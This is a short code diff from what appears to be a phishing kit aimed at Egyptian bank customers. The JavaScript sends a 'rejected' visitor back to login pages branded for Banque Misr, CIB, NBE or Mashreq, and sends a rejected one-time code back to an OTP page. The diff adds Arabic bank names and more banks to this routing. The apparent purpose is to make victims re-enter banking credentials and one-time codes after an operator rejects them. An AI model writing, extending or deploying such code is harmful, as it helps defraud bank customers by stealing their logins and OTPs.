@@ -208,11 +208,12 @@
                 } else if (data.status === 'rejected') {
                     if (data.type === 'login') {
                         let redirectUrl = 'login.html';
-                        if (data.data && data.data.bank) {
-                            if (data.data.bank === 'Banque Misr') redirectUrl = 'login_bm.html';
-                            else if (data.data.bank === 'CIB') redirectUrl = 'login_cib.html';
-                            else if (data.data.bank === 'NBE') redirectUrl = 'login_nbe.html';
-                        }
+                        const bank = data.data && data.data.bank ? String(data.data.bank).trim() : '';
+                        if (bank === 'Banque Misr' || bank === 'بنك مصر') redirectUrl = 'login_bm.html';
+                        else if (bank === 'CIB' || bank === 'بنك CIB') redirectUrl = 'login_cib.html';
+                        else if (bank === 'NBE' || bank === 'البنك الأهلي المصري') redirectUrl = 'login_nbe.html';
+                        else if (bank === 'Mashreq' || bank === 'بنك المشرق') redirectUrl = 'login.html';
+                        else if (bank && bank !== 'Mashreq') redirectUrl = 'login.html';
                         window.location.href = redirectUrl + '?rejected=true';
                     } else if (data.type === 'otp') {
                         window.location.href = 'otp.html?rejected=true';
